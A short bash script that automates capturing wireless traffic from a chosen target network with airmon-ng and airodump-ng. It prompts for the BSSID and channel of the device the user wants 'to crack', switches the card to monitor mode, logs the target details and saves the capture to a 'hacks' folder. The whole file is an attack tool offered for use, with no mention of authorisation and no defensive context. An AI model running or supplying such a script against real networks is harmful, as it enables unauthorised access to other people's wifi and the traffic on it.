#! /bin/bash

# show information about you wifi card
iwconfig
printf "Write name of your wifi card: "
read wifi_card

# stop monitor mode, if enabled
wifi_card_mon=$wifi_card"mon"
airmon-ng stop $wifi_card_mon
sleep 5

# show information about wireless hotspots
nmcli dev wifi list

printf "Write bssid of device, which you want to crack: "
read bssid
printf "Write channel of device: "
read channel

# start monitor mode and kill processes
airmon-ng start $wifi_card

# preliminary preparation
printf "Write filename, where you want to save data: "
read filename
mkdir "hacks" || echo "Dir hacks/ exists, that's ok"

log_file='random_file_name_with_logs.txt'
echo $bssid > $log_file
echo $filename >> $log_file
echo $wifi_card_mon >> $log_file

# start capturing data
airodump-ng --bssid $bssid --channel $channel -w "hacks/"$filename $wifi_card_mon